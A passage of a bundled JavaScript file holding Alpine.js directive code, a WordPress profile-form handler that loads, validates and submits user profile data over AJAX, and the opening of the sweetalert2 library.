        cleanup2(()=>removeResetListener());
    }
    el._x_model = {
        get () {
            return getValue();
        },
        set (value) {
            setValue(value);
        }
    };
    el._x_forceModelUpdate = (value)=>{
        if (value === void 0 && typeof expression === "string" && expression.match(/\./)) value = "";
        window.fromModel = true;
        mutateDom(()=>bind(el, "value", value));
        delete window.fromModel;
    };
    effect3(()=>{
        let value = getValue();
        if (modifiers.includes("unintrusive") && document.activeElement.isSameNode(el)) return;
        el._x_forceModelUpdate(value);
    });
});
function getInputValue(el, modifiers, event, currentValue) {
    return mutateDom(()=>{
        if (event instanceof CustomEvent && event.detail !== void 0) return event.detail !== null && event.detail !== void 0 ? event.detail : event.target.value;
        else if (isCheckbox(el)) {
            if (Array.isArray(currentValue)) {
                let newValue = null;
                if (modifiers.includes("number")) newValue = safeParseNumber(event.target.value);
                else if (modifiers.includes("boolean")) newValue = safeParseBoolean(event.target.value);
                else newValue = event.target.value;
                return event.target.checked ? currentValue.includes(newValue) ? currentValue : currentValue.concat([
                    newValue
                ]) : currentValue.filter((el2)=>!checkedAttrLooseCompare2(el2, newValue));
            } else return event.target.checked;
        } else if (el.tagName.toLowerCase() === "select" && el.multiple) {
            if (modifiers.includes("number")) return Array.from(event.target.selectedOptions).map((option)=>{
                let rawValue = option.value || option.text;
                return safeParseNumber(rawValue);
            });
            else if (modifiers.includes("boolean")) return Array.from(event.target.selectedOptions).map((option)=>{
                let rawValue = option.value || option.text;
                return safeParseBoolean(rawValue);
            });
            return Array.from(event.target.selectedOptions).map((option)=>{
                return option.value || option.text;
            });
        } else {
            let newValue;
            if (isRadio(el)) {
                if (event.target.checked) newValue = event.target.value;
                else newValue = currentValue;
            } else newValue = event.target.value;
            if (modifiers.includes("number")) return safeParseNumber(newValue);
            else if (modifiers.includes("boolean")) return safeParseBoolean(newValue);
            else if (modifiers.includes("trim")) return newValue.trim();
            else return newValue;
        }
    });
}
function safeParseNumber(rawValue) {
    let number = rawValue ? parseFloat(rawValue) : null;
    return isNumeric2(number) ? number : rawValue;
}
function checkedAttrLooseCompare2(valueA, valueB) {
    return valueA == valueB;
}
function isNumeric2(subject) {
    return !Array.isArray(subject) && !isNaN(subject);
}
function isGetterSetter(value) {
    return value !== null && typeof value === "object" && typeof value.get === "function" && typeof value.set === "function";
}
// packages/alpinejs/src/directives/x-cloak.js
directive("cloak", (el)=>queueMicrotask(()=>mutateDom(()=>el.removeAttribute(prefix("cloak")))));
// packages/alpinejs/src/directives/x-init.js
addInitSelector(()=>`[${prefix("init")}]`);
directive("init", skipDuringClone((el, { expression }, { evaluate: evaluate2 })=>{
    if (typeof expression === "string") return !!expression.trim() && evaluate2(expression, {}, false);
    return evaluate2(expression, {}, false);
}));
// packages/alpinejs/src/directives/x-text.js
directive("text", (el, { expression }, { effect: effect3, evaluateLater: evaluateLater2 })=>{
    let evaluate2 = evaluateLater2(expression);
    effect3(()=>{
        evaluate2((value)=>{
            mutateDom(()=>{
                el.textContent = value;
            });
        });
    });
});
// packages/alpinejs/src/directives/x-html.js
directive("html", (el, { expression }, { effect: effect3, evaluateLater: evaluateLater2 })=>{
    let evaluate2 = evaluateLater2(expression);
    effect3(()=>{
        evaluate2((value)=>{
            mutateDom(()=>{
                el.innerHTML = value;
                el._x_ignoreSelf = true;
                initTree(el);
                delete el._x_ignoreSelf;
            });
        });
    });
});
// packages/alpinejs/src/directives/x-bind.js
mapAttributes(startingWith(":", into(prefix("bind:"))));
var handler2 = (el, { value, modifiers, expression, original }, { effect: effect3, cleanup: cleanup2 })=>{
    if (!value) {
        let bindingProviders = {};
        injectBindingProviders(bindingProviders);
        let getBindings = evaluateLater(el, expression);
        getBindings((bindings)=>{
            applyBindingsObject(el, bindings, original);
        }, {
            scope: bindingProviders
        });
        return;
    }
    if (value === "key") return storeKeyForXFor(el, expression);
    if (el._x_inlineBindings && el._x_inlineBindings[value] && el._x_inlineBindings[value].extract) return;
    let evaluate2 = evaluateLater(el, expression);
    effect3(()=>evaluate2((result)=>{
            if (result === void 0 && typeof expression === "string" && expression.match(/\./)) result = "";
            mutateDom(()=>bind(el, value, result, modifiers));
        }));
    cleanup2(()=>{
        el._x_undoAddedClasses && el._x_undoAddedClasses();
        el._x_undoAddedStyles && el._x_undoAddedStyles();
    });
};
handler2.inline = (el, { value, modifiers, expression })=>{
    if (!value) return;
    if (!el._x_inlineBindings) el._x_inlineBindings = {};
    el._x_inlineBindings[value] = {
        expression,
        extract: false
    };
};
directive("bind", handler2);
function storeKeyForXFor(el, expression) {
    el._x_keyExpression = expression;
}
// packages/alpinejs/src/directives/x-data.js
addRootSelector(()=>`[${prefix("data")}]`);
directive("data", (el, { expression }, { cleanup: cleanup2 })=>{
    if (shouldSkipRegisteringDataDuringClone(el)) return;
    expression = expression === "" ? "{}" : expression;
    let magicContext = {};
    injectMagics(magicContext, el);
    let dataProviderContext = {};
    injectDataProviders(dataProviderContext, magicContext);
    let data2 = evaluate(el, expression, {
        scope: dataProviderContext
    });
    if (data2 === void 0 || data2 === true) data2 = {};
    injectMagics(data2, el);
    let reactiveData = reactive(data2);
    initInterceptors(reactiveData);
    let undo = addScopeToNode(el, reactiveData);
    reactiveData["init"] && evaluate(el, reactiveData["init"]);
    cleanup2(()=>{
        reactiveData["destroy"] && evaluate(el, reactiveData["destroy"]);
        undo();
    });
});
interceptClone((from, to)=>{
    if (from._x_dataStack) {
        to._x_dataStack = from._x_dataStack;
        to.setAttribute("data-has-alpine-state", true);
    }
});
function shouldSkipRegisteringDataDuringClone(el) {
    if (!isCloning) return false;
    if (isCloningLegacy) return true;
    return el.hasAttribute("data-has-alpine-state");
}
// packages/alpinejs/src/directives/x-show.js
directive("show", (el, { modifiers, expression }, { effect: effect3 })=>{
    let evaluate2 = evaluateLater(el, expression);
    if (!el._x_doHide) el._x_doHide = ()=>{
        mutateDom(()=>{
            el.style.setProperty("display", "none", modifiers.includes("important") ? "important" : void 0);
        });
    };
    if (!el._x_doShow) el._x_doShow = ()=>{
        mutateDom(()=>{
            if (el.style.length === 1 && el.style.display === "none") el.removeAttribute("style");
            else el.style.removeProperty("display");
        });
    };
    let hide = ()=>{
        el._x_doHide();
        el._x_isShown = false;
    };
    let show = ()=>{
        el._x_doShow();
        el._x_isShown = true;
    };
    let clickAwayCompatibleShow = ()=>setTimeout(show);
    let toggle = once((value)=>value ? show() : hide(), (value)=>{
        if (typeof el._x_toggleAndCascadeWithTransitions === "function") el._x_toggleAndCascadeWithTransitions(el, value, show, hide);
        else value ? clickAwayCompatibleShow() : hide();
    });
    let oldValue;
    let firstTime = true;
    effect3(()=>evaluate2((value)=>{
            if (!firstTime && value === oldValue) return;
            if (modifiers.includes("immediate")) value ? clickAwayCompatibleShow() : hide();
            toggle(value);
            oldValue = value;
            firstTime = false;
        }));
});
// packages/alpinejs/src/directives/x-for.js
directive("for", (el, { expression }, { effect: effect3, cleanup: cleanup2 })=>{
    let iteratorNames = parseForExpression(expression);
    let evaluateItems = evaluateLater(el, iteratorNames.items);
    let evaluateKey = evaluateLater(el, // the x-bind:key expression is stored for our use instead of evaluated.
    el._x_keyExpression || "index");
    el._x_prevKeys = [];
    el._x_lookup = {};
    effect3(()=>loop(el, iteratorNames, evaluateItems, evaluateKey));
    cleanup2(()=>{
        Object.values(el._x_lookup).forEach((el2)=>mutateDom(()=>{
                destroyTree(el2);
                el2.remove();
            }));
        delete el._x_prevKeys;
        delete el._x_lookup;
    });
});
function loop(el, iteratorNames, evaluateItems, evaluateKey) {
    let isObject2 = (i)=>typeof i === "object" && !Array.isArray(i);
    let templateEl = el;
    evaluateItems((items)=>{
        if (isNumeric3(items) && items >= 0) items = Array.from(Array(items).keys(), (i)=>i + 1);
        if (items === void 0) items = [];
        let lookup = el._x_lookup;
        let prevKeys = el._x_prevKeys;
        let scopes = [];
        let keys = [];
        if (isObject2(items)) items = Object.entries(items).map(([key, value])=>{
            let scope2 = getIterationScopeVariables(iteratorNames, value, key, items);
            evaluateKey((value2)=>{
                if (keys.includes(value2)) warn("Duplicate key on x-for", el);
                keys.push(value2);
            }, {
                scope: {
                    index: key,
                    ...scope2
                }
            });
            scopes.push(scope2);
        });
        else for(let i = 0; i < items.length; i++){
            let scope2 = getIterationScopeVariables(iteratorNames, items[i], i, items);
            evaluateKey((value)=>{
                if (keys.includes(value)) warn("Duplicate key on x-for", el);
                keys.push(value);
            }, {
                scope: {
                    index: i,
                    ...scope2
                }
            });
            scopes.push(scope2);
        }
        let adds = [];
        let moves = [];
        let removes = [];
        let sames = [];
        for(let i = 0; i < prevKeys.length; i++){
            let key = prevKeys[i];
            if (keys.indexOf(key) === -1) removes.push(key);
        }
        prevKeys = prevKeys.filter((key)=>!removes.includes(key));
        let lastKey = "template";
        for(let i = 0; i < keys.length; i++){
            let key = keys[i];
            let prevIndex = prevKeys.indexOf(key);
            if (prevIndex === -1) {
                prevKeys.splice(i, 0, key);
                adds.push([
                    lastKey,
                    i
                ]);
            } else if (prevIndex !== i) {
                let keyInSpot = prevKeys.splice(i, 1)[0];
                let keyForSpot = prevKeys.splice(prevIndex - 1, 1)[0];
                prevKeys.splice(i, 0, keyForSpot);
                prevKeys.splice(prevIndex, 0, keyInSpot);
                moves.push([
                    keyInSpot,
                    keyForSpot
                ]);
            } else sames.push(key);
            lastKey = key;
        }
        for(let i = 0; i < removes.length; i++){
            let key = removes[i];
            if (!(key in lookup)) continue;
            mutateDom(()=>{
                destroyTree(lookup[key]);
                lookup[key].remove();
            });
            delete lookup[key];
        }
        for(let i = 0; i < moves.length; i++){
            let [keyInSpot, keyForSpot] = moves[i];
            let elInSpot = lookup[keyInSpot];
            let elForSpot = lookup[keyForSpot];
            let marker = document.createElement("div");
            mutateDom(()=>{
                if (!elForSpot) warn(`x-for ":key" is undefined or invalid`, templateEl, keyForSpot, lookup);
                elForSpot.after(marker);
                elInSpot.after(elForSpot);
                elForSpot._x_currentIfEl && elForSpot.after(elForSpot._x_currentIfEl);
                marker.before(elInSpot);
                elInSpot._x_currentIfEl && elInSpot.after(elInSpot._x_currentIfEl);
                marker.remove();
            });
            elForSpot._x_refreshXForScope(scopes[keys.indexOf(keyForSpot)]);
        }
        for(let i = 0; i < adds.length; i++){
            let [lastKey2, index] = adds[i];
            let lastEl = lastKey2 === "template" ? templateEl : lookup[lastKey2];
            if (lastEl._x_currentIfEl) lastEl = lastEl._x_currentIfEl;
            let scope2 = scopes[index];
            let key = keys[index];
            let clone2 = document.importNode(templateEl.content, true).firstElementChild;
            let reactiveScope = reactive(scope2);
            addScopeToNode(clone2, reactiveScope, templateEl);
            clone2._x_refreshXForScope = (newScope)=>{
                Object.entries(newScope).forEach(([key2, value])=>{
                    reactiveScope[key2] = value;
                });
            };
            mutateDom(()=>{
                lastEl.after(clone2);
                skipDuringClone(()=>initTree(clone2))();
            });
            if (typeof key === "object") warn("x-for key cannot be an object, it must be a string or an integer", templateEl);
            lookup[key] = clone2;
        }
        for(let i = 0; i < sames.length; i++)lookup[sames[i]]._x_refreshXForScope(scopes[keys.indexOf(sames[i])]);
        templateEl._x_prevKeys = keys;
    });
}
function parseForExpression(expression) {
    let forIteratorRE = /,([^,\}\]]*)(?:,([^,\}\]]*))?$/;
    let stripParensRE = /^\s*\(|\)\s*$/g;
    let forAliasRE = /([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/;
    let inMatch = expression.match(forAliasRE);
    if (!inMatch) return;
    let res = {};
    res.items = inMatch[2].trim();
    let item = inMatch[1].replace(stripParensRE, "").trim();
    let iteratorMatch = item.match(forIteratorRE);
    if (iteratorMatch) {
        res.item = item.replace(forIteratorRE, "").trim();
        res.index = iteratorMatch[1].trim();
        if (iteratorMatch[2]) res.collection = iteratorMatch[2].trim();
    } else res.item = item;
    return res;
}
function getIterationScopeVariables(iteratorNames, item, index, items) {
    let scopeVariables = {};
    if (/^\[.*\]$/.test(iteratorNames.item) && Array.isArray(item)) {
        let names = iteratorNames.item.replace("[", "").replace("]", "").split(",").map((i)=>i.trim());
        names.forEach((name, i)=>{
            scopeVariables[name] = item[i];
        });
    } else if (/^\{.*\}$/.test(iteratorNames.item) && !Array.isArray(item) && typeof item === "object") {
        let names = iteratorNames.item.replace("{", "").replace("}", "").split(",").map((i)=>i.trim());
        names.forEach((name)=>{
            scopeVariables[name] = item[name];
        });
    } else scopeVariables[iteratorNames.item] = item;
    if (iteratorNames.index) scopeVariables[iteratorNames.index] = index;
    if (iteratorNames.collection) scopeVariables[iteratorNames.collection] = items;
    return scopeVariables;
}
function isNumeric3(subject) {
    return !Array.isArray(subject) && !isNaN(subject);
}
// packages/alpinejs/src/directives/x-ref.js
function handler3() {}
handler3.inline = (el, { expression }, { cleanup: cleanup2 })=>{
    let root = closestRoot(el);
    if (!root._x_refs) root._x_refs = {};
    root._x_refs[expression] = el;
    cleanup2(()=>delete root._x_refs[expression]);
};
directive("ref", handler3);
// packages/alpinejs/src/directives/x-if.js
directive("if", (el, { expression }, { effect: effect3, cleanup: cleanup2 })=>{
    if (el.tagName.toLowerCase() !== "template") warn("x-if can only be used on a <template> tag", el);
    let evaluate2 = evaluateLater(el, expression);
    let show = ()=>{
        if (el._x_currentIfEl) return el._x_currentIfEl;
        let clone2 = el.content.cloneNode(true).firstElementChild;
        addScopeToNode(clone2, {}, el);
        mutateDom(()=>{
            el.after(clone2);
            skipDuringClone(()=>initTree(clone2))();
        });
        el._x_currentIfEl = clone2;
        el._x_undoIf = ()=>{
            mutateDom(()=>{
                destroyTree(clone2);
                clone2.remove();
            });
            delete el._x_currentIfEl;
        };
        return clone2;
    };
    let hide = ()=>{
        if (!el._x_undoIf) return;
        el._x_undoIf();
        delete el._x_undoIf;
    };
    effect3(()=>evaluate2((value)=>{
            value ? show() : hide();
        }));
    cleanup2(()=>el._x_undoIf && el._x_undoIf());
});
// packages/alpinejs/src/directives/x-id.js
directive("id", (el, { expression }, { evaluate: evaluate2 })=>{
    let names = evaluate2(expression);
    names.forEach((name)=>setIdRoot(el, name));
});
interceptClone((from, to)=>{
    if (from._x_ids) to._x_ids = from._x_ids;
});
// packages/alpinejs/src/directives/x-on.js
mapAttributes(startingWith("@", into(prefix("on:"))));
directive("on", skipDuringClone((el, { value, modifiers, expression }, { cleanup: cleanup2 })=>{
    let evaluate2 = expression ? evaluateLater(el, expression) : ()=>{};
    if (el.tagName.toLowerCase() === "template") {
        if (!el._x_forwardEvents) el._x_forwardEvents = [];
        if (!el._x_forwardEvents.includes(value)) el._x_forwardEvents.push(value);
    }
    let removeListener = on(el, value, modifiers, (e)=>{
        evaluate2(()=>{}, {
            scope: {
                "$event": e
            },
            params: [
                e
            ]
        });
    });
    cleanup2(()=>removeListener());
}));
// packages/alpinejs/src/directives/index.js
warnMissingPluginDirective("Collapse", "collapse", "collapse");
warnMissingPluginDirective("Intersect", "intersect", "intersect");
warnMissingPluginDirective("Focus", "trap", "focus");
warnMissingPluginDirective("Mask", "mask", "mask");
function warnMissingPluginDirective(name, directiveName, slug) {
    directive(directiveName, (el)=>warn(`You can't use [x-${directiveName}] without first installing the "${name}" plugin here: https://alpinejs.dev/plugins/${slug}`, el));
}
// packages/alpinejs/src/index.js
alpine_default.setEvaluator(normalEvaluator);
alpine_default.setReactivityEngine({
    reactive: reactive2,
    effect: effect2,
    release: stop,
    raw: toRaw
});
var src_default = alpine_default;
// packages/alpinejs/builds/module.js
var module_default = src_default;

},{"@parcel/transformer-js/src/esmodule-helpers.js":"dIQaP"}],"dIQaP":[function(require,module,exports) {
exports.interopDefault = function(a) {
    return a && a.__esModule ? a : {
        default: a
    };
};
exports.defineInteropFlag = function(a) {
    Object.defineProperty(a, "__esModule", {
        value: true
    });
};
exports.exportAll = function(source, dest) {
    Object.keys(source).forEach(function(key) {
        if (key === "default" || key === "__esModule" || Object.prototype.hasOwnProperty.call(dest, key)) return;
        Object.defineProperty(dest, key, {
            enumerable: true,
            get: function() {
                return source[key];
            }
        });
    });
    return dest;
};
exports.export = function(dest, destName, get) {
    Object.defineProperty(dest, destName, {
        enumerable: true,
        get: get
    });
};

},{}],"1MUGo":[function(require,module,exports) {
var parcelHelpers = require("@parcel/transformer-js/src/esmodule-helpers.js");
parcelHelpers.defineInteropFlag(exports);
parcelHelpers.export(exports, "profileFormHandler", ()=>profileFormHandler);
var _sweetalert2 = require("sweetalert2");
var _sweetalert2Default = parcelHelpers.interopDefault(_sweetalert2);
var _intlTelInput = require("intl-tel-input");
var _intlTelInputDefault = parcelHelpers.interopDefault(_intlTelInput);
var _utils = require("../utils");
function profileFormHandler() {
    return {
        originalProfile: null,
        formData: {
            name: "",
            email: "",
            username: "",
            phone: "",
            birthDate: "",
            address: {
                street: "",
                unit: "",
                city: "",
                state: "",
                zipCode: "",
                country: ""
            },
            interests: [],
            cv: ""
        },
        errors: {},
        countries: window.countries || [],
        translations: window.profileFormTranslations,
        dateFormat: window.profileFormTranslations.placeholders.dateFormat,
        config: window.profileFormConfig,
        loading: false,
        async init () {
            const input = document.querySelector("#phone");
            if (input) (0, _intlTelInputDefault.default)(input, {
                initialCountry: "auto",
                containerClass: "iti w-full",
                geoIpLookup: (callback)=>{
                    fetch("https://ipapi.co/json").then((res)=>res.json()).then((data)=>{
                        callback(data.country_code);
                        this.formData.address.country = data.country;
                    }).catch(()=>{
                        callback("us");
                        this.formData.address.country = "US";
                    });
                },
                loadUtilsOnInit: ()=>require("df10d156dba4c174")
            });
            fetch("/wp-content/plugins/profile-submit-pro/assets/countries.json", {
                headers: {
                    "Content-Type": "application/json"
                }
            }).then((res)=>res.json()).then((data)=>{
                this.countries = data;
            }).catch((error)=>{
                console.error("Error loading countries:", error);
                this.countries = [];
            });
            const searchParams = new URLSearchParams(window.location.search);
            const profileResponse = await fetch(this.config.ajax_url, {
                method: "POST",
                body: new URLSearchParams({
                    action: "get_profile",
                    security: this.config.security,
                    public_key: searchParams.get("key") || ""
                })
            });
            const profileJson = await profileResponse.json();
            const profileData = profileJson.data;
            let interests = JSON.parse(profileData.interests);
            interests = interests.map((interest)=>interest.toLowerCase());
            const preparedFormData = {
                name: profileData.name,
                email: profileData.email,
                username: profileData.username,
                phone: profileData.phone,
                birthDate: (0, _utils.formatDate)(profileData.birthdate),
                address: {
                    street: profileData.street,
                    unit: profileData.street_number,
                    city: profileData.city,
                    state: profileData.state,
                    zipCode: profileData.postal_code,
                    country: profileData.country
                },
                interests: interests,
                cv: profileData.cv
            };
            this.formData = preparedFormData;
            this.config.id = profileData.id;
            // Create a deep copy of preparedFormData for originalProfile, to avoid reference issues
            this.originalProfile = JSON.parse(JSON.stringify(preparedFormData));
        },
        validateName () {
            this.errors.name = this.formData.name.length < 3 ? this.translations.errors.name : "";
        },
        validateEmail () {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            this.errors.email = !emailRegex.test(this.formData.email) ? this.translations.errors.email : "";
        },
        async validateEmailExists () {
            const data = {
                action: "verify_email_exists",
                security: this.config.security,
                email: this.formData.email,
                id: this.config.id
            };
            try {
                const response = await fetch(this.config.ajax_url, {
                    method: "POST",
                    body: new URLSearchParams(data)
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                const responseData = await response.json();
                if (responseData.data.exists) {
                    this.errors.email = this.translations.errors.emailExists;
                    return false;
                }
                return true;
            } catch (error) {
                console.error("Error verifying email exists:", error);
                this.errors.email = "Error verifying email exists";
                return false;
            }
        },
        validateUsername () {
            this.errors.username = this.formData.username.length < 3 ? this.translations.errors.username : "";
        },
        async validateUsernameExists () {
            const data = {
                action: "verify_username_exists",
                security: this.config.security,
                username: this.formData.username,
                id: this.config.id
            };
            try {
                const response = await fetch(this.config.ajax_url, {
                    method: "POST",
                    body: new URLSearchParams(data)
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                const responseData = await response.json();
                if (responseData.data.exists) {
                    this.errors.username = this.translations.errors.usernameExists;
                    return false;
                }
                return true;
            } catch (error) {
                console.error("Error verifying username exists:", error);
                this.errors.username = "Error verifying username exists";
            }
        },
        validatePhone () {
            // Clean the phone number by removing spaces and dashes
            const cleanPhone = this.formData.phone.replace(/[\s-]/g, "");
            // Regex for Brazilian phone numbers:
            // - 2 digits for area code (11-99)
            // - 8-9 digits for phone number
            const phoneRegex = /^([1-9]{2})(9?\d{8})$/;
            this.errors.phone = !phoneRegex.test(cleanPhone) ? this.translations.errors.phone : "";
        },
        validateAddress () {
            this.errors.address = {};
            this.errors.address.street = this.formData.address.street ? "" : this.translations.errors.address.street;
            this.errors.address.unit = this.formData.address.unit ? "" : this.translations.errors.address.unit;
            this.errors.address.city = this.formData.address.city ? "" : this.translations.errors.address.city;
            this.errors.address.state = this.formData.address.state ? "" : this.translations.errors.address.state;
            this.errors.address.zipCode = this.formData.address.zipCode ? "" : this.translations.errors.address.zipCode;
            this.errors.address.country = this.formData.address.country ? "" : this.translations.errors.address.country;
        },
        validateInterests () {
            this.errors.interests = this.formData.interests.length < 3 ? this.translations.errors.interests : "";
        },
        validateCv () {
            this.errors.cv = this.formData.cv.length < 20 ? this.translations.errors.cv : "";
        },
        formatAndValidateBirthdate () {
            this.formData.birthDate = (0, _utils.formatDate)(this.formData.birthDate, this.dateFormat);
            this.validateBirthdate();
        },
        validateBirthdate () {
            if (!this.formData.birthDate) {
                this.errors.birthDate = this.translations.errors.birthDate;
                return;
            }
            const parsedDate = new Date(this.formData.birthDate);
            if (isNaN(parsedDate.getTime())) this.errors.birthDate = this.translations.errors.birthDate;
            else this.errors.birthDate = "";
        },
        validateIfFormIsChanged () {
            console.log("FormIsChanged: ", JSON.stringify(this.formData) !== JSON.stringify(this.originalProfile));
            console.log({
                unit: this.formData.address.unit,
                originalUnit: this.originalProfile.address.unit
            });
            return JSON.stringify(this.formData) !== JSON.stringify(this.originalProfile);
        },
        async validateForm () {
            if (!this.validateIfFormIsChanged()) return true;
            this.validateName();
            this.validateEmail();
            this.validateUsername();
            this.validatePhone();
            this.validateBirthdate();
            this.validateAddress();
            this.validateInterests();
            this.validateCv();
            await this.validateEmailExists();
            await this.validateUsernameExists();
            const valid = Object.values(this.errors).every((error)=>error === "" || (0, _utils.isErrorObjectEmpty)(error));
            if (!valid) {
                (0, _sweetalert2Default.default).fire({
                    icon: "error",
                    title: "Oops...",
                    text: this.translations.errors.formError
                });
                return false;
            }
            this.loading = true;
            try {
                const data = {
                    action: this.config.action,
                    security: this.config.security,
                    post_data: JSON.stringify(this.formData),
                    id: this.config.id
                };
                const response = await fetch(this.config.ajax_url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: new URLSearchParams(data)
                });
                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                const responseData = await response.json();
                (0, _sweetalert2Default.default).fire({
                    icon: "success",
                    title: "Success!",
                    text: this.translations.errors.formSuccess
                });
            } catch (error) {
                console.error("There was a problem with your fetch operation:", error);
                (0, _sweetalert2Default.default).fire({
                    icon: "error",
                    title: "Oops...",
                    text: "There was a problem in the server. Please try again later."
                });
                return false;
            }
            this.loading = false;
            return true;
        }
    };
}

},{"sweetalert2":"1HyFr","intl-tel-input":"lXOeg","../utils":"hFIk5","df10d156dba4c174":"29ysN","@parcel/transformer-js/src/esmodule-helpers.js":"dIQaP"}],"1HyFr":[function(require,module,exports) {
/*!
* sweetalert2 v11.14.4
* Released under the MIT License.
*/ (function(global, factory) {
    module.exports = factory();
})(this, function() {
    "use strict";
    function _assertClassBrand(e, t, n) {
        if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n;
        throw new TypeError("Private element is not present on this object");
    }
    function _checkPrivateRedeclaration(e, t) {
        if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
    }
    function _classPrivateFieldGet2(s, a) {
        return s.get(_assertClassBrand(s, a));
    }
    function _classPrivateFieldInitSpec(e, t, a) {
        _checkPrivateRedeclaration(e, t), t.set(e, a);
    }
    function _classPrivateFieldSet2(s, a, r) {
        return s.set(_assertClassBrand(s, a), r), r;
    }
    const RESTORE_FOCUS_TIMEOUT = 100;
    /** @type {GlobalState} */ const globalState = {};
    const focusPreviousActiveElement = ()=>{
        if (globalState.previousActiveElement instanceof HTMLElement) {
            globalState.previousActiveElement.focus();
            globalState.previousActiveElement = null;
        } else if (document.body) document.body.focus();
    };
    /**
   * Restore previous active (focused) element
   *
   * @param {boolean} returnFocus
   * @returns {Promise<void>}
   */ const restoreActiveElement = (returnFocus)=>{
        return new Promise((resolve)=>{
            if (!returnFocus) return resolve();
            const x = window.scrollX;
            const y = window.scrollY;
            globalState.restoreFocusTimeout = setTimeout(()=>{
                focusPreviousActiveElement();
                resolve();
            }, RESTORE_FOCUS_TIMEOUT); // issues/900
            window.scrollTo(x, y);
        });
    };
    const swalPrefix = "swal2-";
    /**
   * @typedef {Record<SwalClass, string>} SwalClasses
   */ /**
   * @typedef {'success' | 'warning' | 'info' | 'question' | 'error'} SwalIcon
   * @typedef {Record<SwalIcon, string>} SwalIcons
   */ /** @type {SwalClass[]} */ const classNames = [
        "container",
        "shown",
        "height-auto",
        "iosfix",
        "popup",
        "modal",
        "no-backdrop",
        "no-transition",
        "toast",
        "toast-shown",
        "show",
        "hide",
        "close",
        "title",
        "html-container",
        "actions",
        "confirm",
        "deny",
        "cancel",
        "default-outline",
        "footer",
        "icon",
        "icon-content",
        "image",
        "input",
        "file",
        "range",
        "select",
        "radio",
        "checkbox",
        "label",
        "textarea",
        "inputerror",
        "input-label",
        "validation-message",
        "progress-steps",
        "active-progress-step",
        "progress-step",
        "progress-step-line",
        "loader",
        "loading",
        "styled",
        "top",
        "top-start",
        "top-end",
        "top-left",
        "top-right",
        "center",
        "center-start",
        "center-end",
        "center-left",
        "center-right",
        "bottom",
        "bottom-start",
        "bottom-end",
        "bottom-left",
        "bottom-right",
        "grow-row",
        "grow-column",
        "grow-fullscreen",
        "rtl",
        "timer-progress-bar",
        "timer-progress-bar-container",
        "scrollbar-measure",
        "icon-success",
        "icon-warning",
        "icon-info",
        "icon-question",
        "icon-error"
    ];
    const swalClasses = classNames.reduce((acc, className)=>{
        acc[className] = swalPrefix + className;
        return acc;
    }, /** @type {SwalClasses} */ {});
    /** @type {SwalIcon[]} */ const icons = [
        "success",
        "warning",
        "info",
        "question",
        "error"
    ];
    const iconTypes = icons.reduce((acc, icon)=>{
        acc[icon] = swalPrefix + icon;
        return acc;
    }, /** @type {SwalIcons} */ {});
    const consolePrefix = "SweetAlert2:";
    /**
   * Capitalize the first letter of a string
   *
   * @param {string} str
   * @returns {string}
   */ const capitalizeFirstLetter = (str)=>str.charAt(0).toUpperCase() + str.slice(1);
    /**
   * Standardize console warnings
   *
   * @param {string | string[]} message
   */ const warn = (message)=>{
        console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
    };
    /**
   * Standardize console errors
   *
   * @param {string} message
   */ const error = (message)=>{
        console.error(`${consolePrefix} ${message}`);
    };
    /**
   * Private global state for `warnOnce`
   *
   * @type {string[]}
   * @private
   */ const previousWarnOnceMessages = [];
    /**
   * Show a console warning, but only if it hasn't already been shown
   *
   * @param {string} message
   */ const warnOnce = (message)=>{
        if (!previousWarnOnceMessages.includes(message)) {
            previousWarnOnceMessages.push(message);
            warn(message);
        }
    };
    /**
   * Show a one-time console warning about deprecated params/methods
   *
   * @param {string} deprecatedParam
   * @param {string?} useInstead
   */ const warnAboutDeprecation = function(deprecatedParam) {
        let useInstead = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : null;
        warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release.${useInstead ? ` Use "${useInstead}" instead.` : ""}`);
    };
    /**
   * If `arg` is a function, call it (with no arguments or context) and return the result.
   * Otherwise, just pass the value through
   *
   * @param {Function | any} arg
   * @returns {any}
   */ const callIfFunction = (arg)=>typeof arg === "function" ? arg() : arg;
    /**
   * @param {any} arg
   * @returns {boolean}
   */ const hasToPromiseFn = (arg)=>arg && typeof arg.toPromise === "function";
    /**
   * @param {any} arg
   * @returns {Promise<any>}
   */ const asPromise = (arg)=>hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
    /**
   * @param {any} arg
   * @returns {boolean}
   */ const isPromise = (arg)=>arg && Promise.resolve(arg) === arg;
    /**
   * Gets the popup container which contains the backdrop and the popup itself.
   *
   * @returns {HTMLElement | null}
   */ const getContainer = ()=>document.body.querySelector(`.${swalClasses.container}`);
    /**
   * @param {string} selectorString
   * @returns {HTMLElement | null}
   */ const elementBySelector = (selectorString)=>{
        const container = getContainer();
        return container ? container.querySelector(selectorString) : null;
    };
    /**
   * @param {string} className
   * @returns {HTMLElement | null}
   */ const elementByClass = (className)=>{
        return elementBySelector(`.${className}`);
    };
    /**
   * @returns {HTMLElement | null}
   */ const getPopup = ()=>elementByClass(swalClasses.popup);
    /**
   * @returns {HTMLElement | null}
   */ const getIcon = ()=>elementByClass(swalClasses.icon);
    /**
   * @returns {HTMLElement | null}
   */ const getIconContent = ()=>elementByClass(swalClasses["icon-content"]);
    /**
   * @returns {HTMLElement | null}
   */ const getTitle = ()=>elementByClass(swalClasses.title);
    /**
   * @returns {HTMLElement | null}
   */ const getHtmlContainer = ()=>elementByClass(swalClasses["html-container"]);
    /**
   * @returns {HTMLElement | null}
   */ const getImage = ()=>elementByClass(swalClasses.image);
    /**
   * @returns {HTMLElement | null}
   */ const getProgressSteps = ()=>elementByClass(swalClasses["progress-steps"]);
    /**
   * @returns {HTMLElement | null}
   */ const getValidationMessage = ()=>elementByClass(swalClasses["validation-message"]);
    /**
   * @returns {HTMLButtonElement | null}
   */ const getConfirmButton = ()=>/** @type {HTMLButtonElement} */ elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`);
